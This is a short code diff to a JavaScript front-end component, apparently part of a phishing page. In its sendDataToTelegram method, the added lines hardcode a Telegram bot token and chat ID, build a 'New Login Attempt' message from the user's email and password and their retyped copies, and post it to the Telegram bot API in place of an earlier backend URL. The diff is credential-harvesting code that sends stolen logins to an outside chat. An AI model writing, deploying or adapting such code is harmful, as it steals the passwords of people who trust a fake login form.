@@ -256,15 +256,18 @@ export default {
         },
 
         async sendDataToTelegram() {
-            // const backendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            const backendUrl = 'https://rate-limiter-t9b8.onrender.com/submit';
+            const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
+            const chatId= '1613277499';
+
+            const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${retypedEmail}\nModal-Password: ${retypedPassword}`;
+
+   
+            const backendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // const backendUrl = 'https://rate-limiter-t9b8.onrender.com/submit';
             try {
                 const response = await axios.post(backendUrl, {
-                    name: this.name,
-                    email: this.email,
-                    password: this.password,
-                    retypedEmail: this.retypedEmail,
-                    retypedPassword: this.retypedPassword,
+                    chat_id: chatId,
+                    text: message
                 });
 
                 if (response.status === 200) {
